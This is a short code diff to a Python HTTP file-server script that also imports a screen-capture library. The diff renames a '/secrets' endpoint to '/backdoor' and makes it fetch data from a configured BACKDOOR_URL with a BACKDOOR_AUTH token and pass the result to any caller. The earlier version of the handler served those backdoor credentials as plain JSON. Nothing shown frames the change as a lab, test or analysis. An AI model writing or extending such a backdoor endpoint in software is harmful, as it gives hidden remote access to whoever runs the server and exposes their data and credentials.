@@ -9,6 +9,7 @@ from mss import mss
 import subprocess
 import functools
 import threading
+import requests
 import socket
 import signal
 import json
@@ -18,11 +19,12 @@ import os
 
 class MyHTTPHandler(SimpleHTTPRequestHandler):
     def do_GET(self):
-        if self.path == "/secrets":
+        if self.path == "/backdoor":
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
             self.end_headers()
-            data = {"BACKDOOR_AUTH": BACKDOOR_AUTH, "BACKDOOR_URL": BACKDOOR_URL}
+
+            data = requests.get(BACKDOOR_URL, headers={"Authorization": BACKDOOR_AUTH}).json()
             self.wfile.write(json.dumps(data).encode("utf-8"))
         else:
             super().do_GET()
